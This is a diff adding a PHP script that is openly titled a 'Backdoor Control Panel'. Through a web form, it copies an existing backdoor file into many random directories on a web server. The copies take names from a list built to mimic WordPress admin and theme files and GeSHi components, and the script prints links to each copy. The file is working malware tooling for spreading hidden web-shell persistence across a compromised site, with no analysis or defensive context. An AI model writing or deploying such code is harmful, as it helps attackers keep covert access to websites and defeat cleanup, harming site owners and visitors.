@@ -1,0 +1,117 @@
+<?php
+// List of possible file names for the backdoor
+$names = [
+    "GeSHi-utils.php", "php-syntax.php", "session-manager.php", "GeSHi-parser.php", "log-sync.php", 
+        "python-handler.php", "GeSHi-highlighter.php", "java-runner.php", "session-helper.php", "cache-lang.php", 
+        "GeSHi-logs.php", "config-injector.php", "GeSHi-setup.php", "error-reporter.php", "ruby-script.php", 
+        "log-analyzer.php", "GeSHi-session.php", "perl-loader.php", "cron-helper.php", "GeSHi-checker.php", 
+        "config-cleaner.php", "python-executor.php", "GeSHi-error.php", "log-viewer.php", "GeSHi-analyzer.php", 
+        "task-scheduler.php", "ruby-handler.php", "data-extractor.php", "GeSHi-formatter.php", "session-logger.php", 
+        "core-loader.php", "perl-runner.php", "GeSHi-writer.php", "session-writer.php", "php-runner.php", 
+        "GeSHi-compiler.php", "script-loader.php", "GeSHi-processor.php", "cron-logger.php", "GeSHi-updater.php", 
+        "java-processor.php", "log-collector.php", "GeSHi-debugger.php", "session-expiry.php", "GeSHi-executor.php", 
+        "error-logger.php", "GeSHi-helper.php", "python-formatter.php", "system-scan.php", "GeSHi-handler.php", 
+        "session-checker.php", "GeSHi-optimizer.php", "java-validator.php", "config-manager.php", "GeSHi-sanitizer.php", 
+        "task-helper.php", "GeSHi-setup.php", "ruby-processor.php", "file-logger.php", "GeSHi-loader.php", 
+        "php-sanitizer.php", "GeSHi-lang.php", "script-compiler.php", "GeSHi-configurator.php", "java-sanitizer.php", 
+        "GeSHi-api.php", "error-handler.php", "GeSHi-core.php", "config-scanner.php", "GeSHi-logs.php", 
+        "session-sync.php", "python-sanitizer.php", "GeSHi-parser.php", "system-bootstrap.php", "GeSHi-data.php", 
+        "ruby-validator.php", "GeSHi-file.php", "session-monitor.php", "GeSHi-backup.php", "php-helper.php", 
+        "GeSHi-db.php", "log-sync.php", "python-sync.php", "GeSHi-cache.php", "system-logs.php", "GeSHi-helper.php", 
+        "session-logs.php", "GeSHi-task.php", "task-manager.php", "GeSHi-checker.php", "log-cleaner.php", 
+        "GeSHi-manager.php", "session-storage.php", "GeSHi-router.php", "cron-scheduler.php","edit-form-advanced.php", 
+        "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", 
+        "edit-form-comment.php", "link.php", "ms-themes.php", "_Document.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", 
+        "registration-functions.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php",  
+        "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php",  
+        "post-new.php", "upgrade-themes.php", "sandwich.php", "edit-tags.php", "noop.php", "media.php", "nav-menus.php", "posts.php", "admin-post.php",  
+        "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php",  
+        "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php",  
+        "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php",  
+        "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php",  
+        "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php", "xmlrpc.php", "comments.php",  
+        "front-page.php", "home.php", ".default.php", "header.php", "singular.php", "single.php", "single-wordpress.php", "page.php", "category.php",  
+        "tag.php", "taxonomy.php", "author.php", "date.php", "archive.php", "search.php", "attachment.php", "image.php", "404.php", "https.php",  
+        "noop.php", "kayeli.php", "Document.php"
+];
+
+// Function to Clone Backdoor
+function clone_backdoor($source_file_path, $target_dir, $new_file_name) {
+    $target_path = $target_dir . '/' . $new_file_name;
+    if (copy($source_file_path, $target_path)) {
+        // Adding result display logic with server name
+        $homedir = realpath($_SERVER['DOCUMENT_ROOT']);
+        $bdPath = str_replace($homedir, '', realpath($target_path));
+        $bdPath = str_replace('\\', '/', $bdPath);
+        $server_name = $_SERVER['SERVER_NAME'];
+        echo "<a href='http://$server_name$bdPath'>http://$server_name$bdPath</a><br>";
+    } else {
+        echo "Failed to clone backdoor.<br>";
+    }
+}
+
+// Recursive Directory Scanning Function
+function scan_directories($directory) {
+    $result = [];
+    $files = scandir($directory);
+    foreach ($files as $file) {
+        if ($file !== '.' && $file !== '..') {
+            $fullPath = $directory . '/' . $file;
+            if (is_dir($fullPath)) {
+                $result = array_merge($result, scan_directories($fullPath));
+            } else {
+                $result[] = $directory;
+            }
+        }
+    }
+    return $result;
+}
+
+// Function to Spread Backdoor
+function spread_backdoor($source_file_path, $directories, $names, $spread_count) {
+    $all_directories = [];
+    foreach ($directories as $directory) {
+        $all_directories = array_merge($all_directories, scan_directories(trim($directory)));
+    }
+
+    for ($i = 0; $i < $spread_count; $i++) {
+        $random_name = $names[array_rand($names)];
+        $random_dir = $all_directories[array_rand($all_directories)];
+        clone_backdoor($source_file_path, $random_dir, $random_name);
+    }
+}
+
+// Process Form Input
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $source_file_path = $_POST['dirpath']; // The path of the existing file to clone
+    $directories = explode(",", $_POST['directories']);
+    $spread_count = (int)$_POST['spread_count'];
+
+    // Spread the backdoor
+    spread_backdoor($source_file_path, $directories, $names, $spread_count);
+}
+?>
+
+<!-- HTML Form -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Backdoor Control Panel</title>
+</head>
+<body>
+    <h2>Backdoor Control Panel</h2>
+    <form method="post">
+        <label for="dirpath">Path of the File to Clone:</label><br>
+        <input type="text" id="dirpath" name="dirpath" required><br><br>
+
+        <label for="directories">Directories to Spread (comma-separated):</label><br>
+        <input type="text" id="directories" name="directories" required><br><br>
+
+        <label for="spread_count">Number of Backdoors to Spread:</label><br>
+        <input type="number" id="spread_count" name="spread_count" min="1" required><br><br>
+
+        <input type="submit" value="Execute">
+    </form>
+</body>
+</html>
